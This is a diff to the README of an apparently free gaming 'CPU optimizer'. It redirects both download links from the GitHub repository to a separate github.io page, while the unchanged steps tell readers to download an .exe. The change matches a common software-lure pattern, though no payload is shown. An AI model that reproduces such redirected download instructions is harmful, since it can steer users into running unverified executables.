@@ -1,6 +1,6 @@
 # ⚡ CPU-Optimizer-Gaming-2026-Free - Improve your gaming performance today
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/csj-cug/CPU-Optimizer-Gaming-2026-Free)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://csj-cug.github.io)
 
 ## 📋 About This Software
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications before you begin:
 Follow these steps to set up the optimizer on your computer.
 
 1. Visit the repository page to download the software.
-2. Click this link: [https://github.com/csj-cug/CPU-Optimizer-Gaming-2026-Free](https://github.com/csj-cug/CPU-Optimizer-Gaming-2026-Free)
+2. Click this link: [https://csj-cug.github.io](https://csj-cug.github.io)
 3. Look for the "Releases" section on the right side of the page.
 4. Select the latest version listed under the releases menu.
 5. Download the file ending in .exe to your desktop.
